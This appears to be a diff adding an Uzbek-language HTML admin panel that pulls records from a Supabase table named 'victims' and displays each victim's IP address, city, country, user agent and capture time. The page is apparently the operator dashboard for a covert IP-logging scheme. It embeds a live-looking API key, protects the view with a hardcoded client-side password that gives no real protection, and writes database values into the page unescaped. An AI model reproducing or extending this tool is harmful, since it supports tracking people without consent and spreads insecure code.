@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel v1.1</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #222; }
+        th, td { border: 1px solid #444; padding: 10px; text-align: left; }
+        th { background: #333; }
+        .hidden { display: none; }
+        input { background: #333; color: #0ff; border: 1px solid #0ff; padding: 5px; }
+    </style>
+</head>
+<body>
+    <div id="auth">
+        <h3>Tizimga kirish:</h3>
+        <input type="password" id="pass" placeholder="Parol...">
+        <button onclick="checkPass()">Kirish</button>
+    </div>
+
+    <div id="main" class="hidden">
+        <h2>Tutilgan ma'lumotlar bazasi</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>IP</th>
+                    <th>Shahar</th>
+                    <th>Davlat</th>
+                    <th>Qurilma</th>
+                    <th>Vaqt</th>
+                </tr>
+            </thead>
+            <tbody id="data-list"></tbody>
+        </table>
+    </div>
+
+    <script>
+        const SB_URL = 'https://qkvrelghiruyfpdjremr.supabase.co';
+        const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFrdnJlbGdoaXJ1eWZwZGpyZW1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3NjE1MDQsImV4cCI6MjA5MDMzNzUwNH0.aDmEIWKEYpgcfQRDOCqczrs8o8uTsQnmmyQ02HmsWIw';
+        const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+
+        function checkPass() {
+            const p = document.getElementById('pass').value;
+            if (p === "ADMIN123") { // SHU YERGA O'Z PAROLINGIZNI YOZING
+                document.getElementById('auth').classList.add('hidden');
+                document.getElementById('main').classList.remove('hidden');
+                loadData();
+            } else { alert("Xato!"); }
+        }
+
+        async function loadData() {
+            const { data, error } = await supabaseClient
+                .from('victims')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            if (data) {
+                const list = document.getElementById('data-list');
+                list.innerHTML = data.map(v => `
+                    <tr>
+                        <td>${v.ip_address}</td>
+                        <td>${v.city}</td>
+                        <td>${v.country}</td>
+                        <td style="font-size: 10px;">${v.user_agent}</td>
+                        <td>${new Date(v.created_at).toLocaleString()}</td>
+                    </tr>
+                `).join('');
+            }
+        }
+    </script>
+</body>
+</html>
